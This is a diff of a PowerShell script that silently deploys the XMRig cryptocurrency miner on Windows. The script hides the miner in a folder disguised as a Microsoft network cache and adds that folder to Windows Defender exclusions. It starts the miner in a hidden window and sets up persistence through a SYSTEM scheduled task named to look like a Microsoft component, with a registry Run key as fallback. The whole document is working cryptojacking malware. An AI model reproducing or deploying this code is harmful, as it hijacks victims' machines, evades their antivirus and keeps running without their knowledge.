@@ -1,20 +1,19 @@
-# XMRig Silent Deploy FINAL v11 - NO BOM + log visible + BAT wrapper
+# XMRig FINAL v12 - CMD wrapper + debug real + no BOM
 $InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
 if (-not (Test-Path $InstallDir)) {
     New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
     (Get-Item $InstallDir).Attributes += "Hidden"
 }
 
-# Limpieza de archivos antiguos por si acaso
-Remove-Item "$InstallDir\config.json" -Force -ErrorAction SilentlyContinue
-Remove-Item "$InstallDir\start.bat" -Force -ErrorAction SilentlyContinue
+# Limpieza total
+Remove-Item "$InstallDir\*" -Force -Recurse -ErrorAction SilentlyContinue
 
 # Descarga y extracción
 $ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
-$ZipPath = "$env:TEMP\xmrig-final.zip"
+$ZipPath = "$env:TEMP\xmrig-v12.zip"
 Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60
 Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
-Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
+Remove-Item $ZipPath -Force
 
 $Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
 if ($Sub) {
@@ -26,8 +25,8 @@ $ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" -File | Selec
 $ConfigPath = "$InstallDir\config.json"
 $BatPath = "$InstallDir\start.bat"
 
-# Config SIN BOM (usamos ASCII) + log para depurar
-$ConfigJson = @"
+# Config SIN BOM (ASCII) + log obligatorio
+$ConfigJson = @'
 {
   "autosave": false,
   "colors": false,
@@ -45,23 +44,27 @@ $ConfigJson = @"
   }],
   "print-time": 60
 }
-"@
-$ConfigJson | Out-File $ConfigPath -Encoding ascii -Force
+'@
+[System.IO.File]::WriteAllText($ConfigPath, $ConfigJson, [System.Text.Encoding]::ASCII)
 
-# BAT wrapper (más estable)
+# BAT con debug REAL (para saber exactamente qué pasa)
 "@echo off
+echo BAT STARTED %date% %time% > xmr.log
 cd /d `"$InstallDir`"
-start /B xmrig.exe -c config.json -B --no-color" | Out-File $BatPath -Encoding ASCII -Force
+echo Directorio actual: %cd% >> xmr.log
+echo Ejecutando xmrig... >> xmr.log
+start /B xmrig.exe -c config.json -B --no-color >> xmr.log 2>&1
+echo Comando ejecutado >> xmr.log" | Out-File $BatPath -Encoding ASCII -Force
 
-# Excluir del Defender
+# Exclusión Defender
 try { Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue } catch {}
 
 # Arrancar ya
-Start-Process -FilePath $BatPath -WindowStyle Hidden
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$BatPath`"" -WindowStyle Hidden
 
-# Persistencia SYSTEM
+# Persistencia (cmd.exe /c bat = método infalible)
 $TaskName = "MicrosoftNetworkCache"
-$Action  = New-ScheduledTaskAction -Execute $BatPath
+$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$BatPath`""
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 try {
     $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
@@ -71,4 +74,4 @@ try {
 }
 
 # Fallback Registry
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "`"$BatPath`"" -Force
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "cmd.exe /c `"$BatPath`"" -Force
